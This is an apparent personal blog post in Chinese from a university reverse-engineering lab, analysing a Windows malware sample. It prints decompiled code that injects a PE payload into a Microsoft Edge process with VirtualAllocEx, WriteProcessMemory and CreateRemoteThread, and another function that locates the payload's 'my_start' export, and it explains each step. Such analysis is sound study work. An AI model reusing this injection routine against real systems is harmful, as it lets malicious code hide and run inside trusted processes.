<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)
  #


  Background
  #


VirtualAllocEx
記憶體保護常數
WriteProcessMemory
CreateRemoteThread
Export Address Table(EAT)







  Source code
  #

:::spoiler Source Code sub_140001A60
__int64 __fastcall sub_140001A60(DWORD edge_pid, const void *pe_file, SIZE_T pe_file_size)
{
  DWORD v4; // eax
  DWORD LastError; // eax
  HANDLE hProcess; // [rsp+40h] [rbp-38h]
  char *lpBaseAddress; // [rsp+48h] [rbp-30h]
  LPTHREAD_START_ROUTINE lpStartAddress; // [rsp+50h] [rbp-28h]
  __int64 v9; // [rsp+58h] [rbp-20h] BYREF
  DWORD ThreadId; // [rsp+60h] [rbp-18h] BYREF

  v9 = 0i64;
  sub_1400018F0(pe_file, &amp;v9);
  if ( v9 )
  {
    hProcess = OpenProcess(0x43Au, 0, edge_pid);
    if ( hProcess )
    {
      lpBaseAddress = (char *)VirtualAllocEx(hProcess, 0i64, pe_file_size, 0x3000u, 0x40u);
      if ( WriteProcessMemory(hProcess, lpBaseAddress, pe_file, pe_file_size, 0i64) )
      {
        lpStartAddress = (LPTHREAD_START_ROUTINE)&amp;lpBaseAddress[v9];
        CreateRemoteThread(hProcess, 0i64, 0i64, (LPTHREAD_START_ROUTINE)&amp;lpBaseAddress[v9], 0i64, 0, &amp;ThreadId);
        sub_140001260("remote thread id: %lu, loader address: %p", ThreadId, lpStartAddress);
        return 1i64;
      }
      else
      {
        LastError = GetLastError();
        sub_140001260("WriteProcessMemory failed, %lu", LastError);
        return 0i64;
      }
    }
    else
    {
      v4 = GetLastError();
      sub_140001260("OpenProcess failed, %lu", v4);
      return 0i64;
    }
  }
  else
  {
    sub_140001260("get_reflectivce_loader_offset failed\n");
    return 0i64;
  }
}
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)"><meta property="og:description" content='Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3) # Background # VirtualAllocEx 記憶體保護常數 WriteProcessMemory CreateRemoteThread Export Address Table(EAT) Source code # :::spoiler Source Code sub_140001A60
__int64 __fastcall sub_140001A60(DWORD edge_pid, const void *pe_file, SIZE_T pe_file_size) { DWORD v4; // eax DWORD LastError; // eax HANDLE hProcess; // [rsp+40h] [rbp-38h] char *lpBaseAddress; // [rsp+48h] [rbp-30h] LPTHREAD_START_ROUTINE lpStartAddress; // [rsp+50h] [rbp-28h] __int64 v9; // [rsp+58h] [rbp-20h] BYREF DWORD ThreadId; // [rsp+60h] [rbp-18h] BYREF v9 = 0i64; sub_1400018F0(pe_file, &amp;v9); if ( v9 ) { hProcess = OpenProcess(0x43Au, 0, edge_pid); if ( hProcess ) { lpBaseAddress = (char *)VirtualAllocEx(hProcess, 0i64, pe_file_size, 0x3000u, 0x40u); if ( WriteProcessMemory(hProcess, lpBaseAddress, pe_file, pe_file_size, 0i64) ) { lpStartAddress = (LPTHREAD_START_ROUTINE)&amp;lpBaseAddress[v9]; CreateRemoteThread(hProcess, 0i64, 0i64, (LPTHREAD_START_ROUTINE)&amp;lpBaseAddress[v9], 0i64, 0, &amp;ThreadId); sub_140001260("remote thread id: %lu, loader address: %p", ThreadId, lpStartAddress); return 1i64; } else { LastError = GetLastError(); sub_140001260("WriteProcessMemory failed, %lu", LastError); return 0i64; } } else { v4 = GetLastError(); sub_140001260("OpenProcess failed, %lu", v4); return 0i64; } } else { sub_140001260("get_reflectivce_loader_offset failed\n"); return 0i64; } } :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Eductf"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Reverse"><title>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#小節>小節</a><ul><li><a href=#這樣繞一大圈的用途>這樣繞一大圈的用途</a></li><li><a href=#防禦手法>防禦手法</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)
<a class=anchor href=#simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex>VirtualAllocEx</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/Memory/memory-protection-constants>記憶體保護常數</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory>WriteProcessMemory</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread>CreateRemoteThread</a></li><li>Export Address Table(EAT)<blockquote><p><img src=https://hackmd.io/_uploads/rJuBbwaGT.png alt>
<img src=https://hackmd.io/_uploads/HJEI-P6zp.png alt>
<img src=https://hackmd.io/_uploads/S1Qu-PTM6.png alt></p></blockquote></li></ul><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code <code>sub_140001A60</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>sub_140001A60</span>(DWORD edge_pid, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>pe_file, SIZE_T pe_file_size)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  DWORD v4; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  DWORD LastError; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  HANDLE hProcess; <span style=color:#75715e>// [rsp+40h] [rbp-38h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>lpBaseAddress; <span style=color:#75715e>// [rsp+48h] [rbp-30h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  LPTHREAD_START_ROUTINE lpStartAddress; <span style=color:#75715e>// [rsp+50h] [rbp-28h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> v9; <span style=color:#75715e>// [rsp+58h] [rbp-20h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  DWORD ThreadId; <span style=color:#75715e>// [rsp+60h] [rbp-18h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  v9 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>  sub_1400018F0(pe_file, <span style=color:#f92672>&amp;</span>v9);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( v9 )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    hProcess <span style=color:#f92672>=</span> OpenProcess(<span style=color:#ae81ff>0x43Au</span>, <span style=color:#ae81ff>0</span>, edge_pid);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( hProcess )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      lpBaseAddress <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)VirtualAllocEx(hProcess, <span style=color:#ae81ff>0</span>i64, pe_file_size, <span style=color:#ae81ff>0x3000u</span>, <span style=color:#ae81ff>0x40u</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( WriteProcessMemory(hProcess, lpBaseAddress, pe_file, pe_file_size, <span style=color:#ae81ff>0</span>i64) )
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        lpStartAddress <span style=color:#f92672>=</span> (LPTHREAD_START_ROUTINE)<span style=color:#f92672>&amp;</span>lpBaseAddress[v9];
</span></span><span style=display:flex><span>        CreateRemoteThread(hProcess, <span style=color:#ae81ff>0</span>i64, <span style=color:#ae81ff>0</span>i64, (LPTHREAD_START_ROUTINE)<span style=color:#f92672>&amp;</span>lpBaseAddress[v9], <span style=color:#ae81ff>0</span>i64, <span style=color:#ae81ff>0</span>, <span style=color:#f92672>&amp;</span>ThreadId);
</span></span><span style=display:flex><span>        sub_140001260(<span style=color:#e6db74>&#34;remote thread id: %lu, loader address: %p&#34;</span>, ThreadId, lpStartAddress);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>i64;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        LastError <span style=color:#f92672>=</span> GetLastError();
</span></span><span style=display:flex><span>        sub_140001260(<span style=color:#e6db74>&#34;WriteProcessMemory failed, %lu&#34;</span>, LastError);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v4 <span style=color:#f92672>=</span> GetLastError();
</span></span><span style=display:flex><span>      sub_140001260(<span style=color:#e6db74>&#34;OpenProcess failed, %lu&#34;</span>, v4);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    sub_140001260(<span style=color:#e6db74>&#34;get_reflectivce_loader_offset failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li>首先看到他open我們剛剛拿到的edge process</li><li>利用<code>VirtualAllocEx</code>這個API主要可以在指定的process中malloc一塊記憶體，他的大小取決於<code>pe_file_size</code>，而該記憶體配置的類型是<code>MEM_COMMIT</code>+<code>MEM_RESERVE</code>(暫時不用管是甚麼)，然後權限的話是設定0x40(<code>PAGE_EXECUTE_READWRITE</code>)，就是可寫可執行</li><li>#19的意思是說: 把<code>pe_file</code>的資料寫入<code>lpBaseAddress</code>的地方，總共寫入<code>pe_file_size</code>這麼多的大小</li><li>#22的意思是把儲存在<code>(LPTHREAD_START_ROUTINE)&amp;lpBaseAddress[v9]</code>這邊的東西跑起來<blockquote><p>$\to$在 Edge process 中建立 thread，thread 執行起點為 <code>lpBaseAddress[v9]</code></p></blockquote></li></ol><p>:::info
目前為止的資訊
<img src=https://hackmd.io/_uploads/HyYZbvTfT.png alt>
:::</p><hr><ol start=5><li><p>那甚麼是<code>v9</code>呢?
這個變數可以往回看#11~#12的地方，可以跟進去看</p><ol><li>首先，#18的地方很明顯就是在取得export table，因為他拿的地方是在optional header的data directory[0]，也就是export table。至於<code>sub_140001410</code>在幹嘛，簡單說就是把RVA轉回file offset的function</li><li>#30~#46的地方就是像前一篇有講到的一樣，是<code>memcmp("my_start", v13)</code>，仔細比對前面提到的<code>memcmp("msedge.exe", process’s executable file name)</code>，結構幾乎一模一樣</li><li>有了第一部拿到的export table和第二步想要比對的<code>"my_start"</code>字串，通靈後可以想到他就是想要拿到名為<code>my_start</code>的DLL導出函數</li><li>至此，我們已經知道這一個function在做的事情就是去export table中找到<code>my_start</code>這個function後，回傳他的位址
:::spoiler <code>sub_1400018F0</code> Source Code解析前</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>sub_1400018F0</span>(<span style=color:#66d9ef>__int64</span> pe_file, <span style=color:#66d9ef>__int64</span> <span style=color:#f92672>*</span>a2)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  IMAGE_NT_HEADERS <span style=color:#f92672>*</span>NtHdr; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> result; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> v4; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int8</span> <span style=color:#f92672>*</span>v5; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v6; <span style=color:#75715e>// rcx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int8</span> v7; <span style=color:#75715e>// dl
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v8; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int16</span> v9; <span style=color:#75715e>// [rsp+20h] [rbp-38h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> i; <span style=color:#75715e>// [rsp+24h] [rbp-34h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>v11; <span style=color:#75715e>// [rsp+28h] [rbp-30h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> v12; <span style=color:#75715e>// [rsp+30h] [rbp-28h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int8</span> <span style=color:#f92672>*</span>v13; <span style=color:#75715e>// [rsp+38h] [rbp-20h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> v14; <span style=color:#75715e>// [rsp+40h] [rbp-18h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  NtHdr <span style=color:#f92672>=</span> getNtHdr(pe_file);
</span></span><span style=display:flex><span>  v11 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)(sub_140001410(pe_file, NtHdr<span style=color:#f92672>-&gt;</span>OptionalHeader.DataDirectory[<span style=color:#ae81ff>0</span>].VirtualAddress) <span style=color:#f92672>+</span> pe_file);
</span></span><span style=display:flex><span>  v12 <span style=color:#f92672>=</span> v11[<span style=color:#ae81ff>6</span>];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> ( i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ; <span style=color:#f92672>++</span>i )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> i;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( i <span style=color:#f92672>&gt;=</span> v12 )
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    v4 <span style=color:#f92672>=</span> sub_140001410(pe_file, v11[<span style=color:#ae81ff>8</span>]);
</span></span><span style=display:flex><span>    v13 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int8</span> <span style=color:#f92672>*</span>)(sub_140001410(pe_file, <span style=color:#f92672>*</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)(v4 <span style=color:#f92672>+</span> pe_file <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>i64 <span style=color:#f92672>*</span> i)) <span style=color:#f92672>+</span> pe_file);
</span></span><span style=display:flex><span>    v9 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(_WORD <span style=color:#f92672>*</span>)(sub_140001410(pe_file, v11[<span style=color:#ae81ff>9</span>]) <span style=color:#f92672>+</span> pe_file <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>i64 <span style=color:#f92672>*</span> i);
</span></span><span style=display:flex><span>    v14 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)(sub_140001410(pe_file, v11[<span style=color:#ae81ff>7</span>]) <span style=color:#f92672>+</span> pe_file <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>i64 <span style=color:#f92672>*</span> v9);
</span></span><span style=display:flex><span>    v5 <span style=color:#f92672>=</span> v13;
</span></span><span style=display:flex><span>    v6 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(<span style=color:#e6db74>&#34;my_start&#34;</span> <span style=color:#f92672>-</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)v13);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> ( <span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v7 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>v5;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>*</span>v5 <span style=color:#f92672>!=</span> v6[(_QWORD)v5] )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      <span style=color:#f92672>++</span>v5;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>v7 )
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        v8 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LABEL_8;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    v8 <span style=color:#f92672>=</span> v7 <span style=color:#f92672>&lt;</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)v6[(_QWORD)v5] <span style=color:#f92672>?</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>LABEL_8:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>v8 )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      result <span style=color:#f92672>=</span> sub_140001410(pe_file, v14);
</span></span><span style=display:flex><span>      <span style=color:#f92672>*</span>a2 <span style=color:#f92672>=</span> result;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> result;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> result;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><p>:::spoiler <code>sub_1400018F0</code> Source Code解析前</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>getMy_Start_ExportFunction</span>(<span style=color:#66d9ef>__int64</span> pe_file, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> <span style=color:#f92672>*</span>my_start_address_offset)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  IMAGE_NT_HEADERS <span style=color:#f92672>*</span>NtHdr; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> result; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> name_array; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int8</span> <span style=color:#f92672>*</span>v5; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v6; <span style=color:#75715e>// rcx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int8</span> v7; <span style=color:#75715e>// dl
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v8; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int16</span> name_ordinal; <span style=color:#75715e>// [rsp+20h] [rbp-38h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> i; <span style=color:#75715e>// [rsp+24h] [rbp-34h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  IMAGE_EXPORT_DIRECTORY <span style=color:#f92672>*</span>exportTable; <span style=color:#75715e>// [rsp+28h] [rbp-30h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> NumberOfNames; <span style=color:#75715e>// [rsp+30h] [rbp-28h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int8</span> <span style=color:#f92672>*</span>fn_name; <span style=color:#75715e>// [rsp+38h] [rbp-20h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> fn_addr; <span style=color:#75715e>// [rsp+40h] [rbp-18h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  NtHdr <span style=color:#f92672>=</span> getNtHdr(pe_file);
</span></span><span style=display:flex><span>  exportTable <span style=color:#f92672>=</span> (rva2FileOffset(pe_file, NtHdr<span style=color:#f92672>-&gt;</span>OptionalHeader.DataDirectory[<span style=color:#ae81ff>0</span>].VirtualAddress) <span style=color:#f92672>+</span> pe_file);
</span></span><span style=display:flex><span>  NumberOfNames <span style=color:#f92672>=</span> exportTable<span style=color:#f92672>-&gt;</span>NumberOfNames;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> ( i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ; <span style=color:#f92672>++</span>i )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> i;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( i <span style=color:#f92672>&gt;=</span> NumberOfNames )
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    name_array <span style=color:#f92672>=</span> rva2FileOffset(pe_file, exportTable<span style=color:#f92672>-&gt;</span>AddressOfNames);
</span></span><span style=display:flex><span>    fn_name <span style=color:#f92672>=</span> (rva2FileOffset(pe_file, <span style=color:#f92672>*</span>(name_array <span style=color:#f92672>+</span> pe_file <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>i64 <span style=color:#f92672>*</span> i)) <span style=color:#f92672>+</span> pe_file);
</span></span><span style=display:flex><span>    name_ordinal <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(rva2FileOffset(pe_file, exportTable<span style=color:#f92672>-&gt;</span>AddressOfNameOrdinals) <span style=color:#f92672>+</span> pe_file <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>i64 <span style=color:#f92672>*</span> i);
</span></span><span style=display:flex><span>    fn_addr <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(rva2FileOffset(pe_file, exportTable<span style=color:#f92672>-&gt;</span>AddressOfFunctions) <span style=color:#f92672>+</span> pe_file <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>i64 <span style=color:#f92672>*</span> name_ordinal);
</span></span><span style=display:flex><span>    v5 <span style=color:#f92672>=</span> fn_name;
</span></span><span style=display:flex><span>    v6 <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#34;my_start&#34;</span> <span style=color:#f92672>-</span> fn_name);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> ( <span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v7 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>v5;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>*</span>v5 <span style=color:#f92672>!=</span> v6[v5] )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      <span style=color:#f92672>++</span>v5;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>v7 )
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        v8 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LABEL_8;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    v8 <span style=color:#f92672>=</span> v7 <span style=color:#f92672>&lt;</span> v6[v5] <span style=color:#f92672>?</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>LABEL_8:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>v8 )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      result <span style=color:#f92672>=</span> rva2FileOffset(pe_file, fn_addr);
</span></span><span style=display:flex><span>      <span style=color:#f92672>*</span>my_start_address_offset <span style=color:#f92672>=</span> result;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> result;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> result;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p></li></ol><h2 id=小節>小節
